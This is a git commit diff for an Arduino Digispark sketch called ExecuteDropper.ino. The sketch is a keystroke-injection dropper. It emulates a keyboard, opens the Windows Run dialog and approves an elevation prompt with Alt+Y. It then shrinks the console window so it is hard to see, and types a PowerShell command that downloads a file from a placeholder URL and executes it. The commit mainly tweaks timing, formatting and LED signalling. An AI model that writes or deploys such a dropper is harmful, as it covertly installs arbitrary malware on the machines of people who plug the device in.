dab0e880e78a43d2c695092266ba1fe1c8fb0e88
alpiste <maxitedesco1@gmail.com>
2017-10-24 12:02:17 -0300

    update script

--- ExecuteDropper.ino
+++ ExecuteDropper.ino
@@ -6,25 +6,17 @@
 
 
 void digiBegin() {
-  DigiKeyboard.sendKeyStroke(0,0);
+  DigiKeyboard.sendKeyStroke(0, 0);
   DigiKeyboard.delay(50);
 }
 
-void digiEnd() {
-  const int led=1;
-  pinMode(led, OUTPUT);
-  while (1) {
-    digitalWrite(led, !digitalRead(led));
-    DigiKeyboard.delay(1000);
-  }
-}
 
 void setup() {
   digiBegin();
-
+ 
   DigiKeyboard.delay(1000);
 
-  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 
   DigiKeyboard.delay(200);
 
@@ -32,19 +24,22 @@ void setup() {
 
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(5000);
 
-  DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
 
   DigiKeyboard.delay(1000);
 
   DigiKeyboard.println("mode con:cols=18 lines=1");
-  
+
   DigiKeyboard.delay(1000);
-    
+
   DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = '"URL"'; $file = '"FILE"'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
-  
+
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  pinMode(1, OUTPUT);
+  digitalWrite(1, HIGH);
 
 }
 /* Unused endless loop */
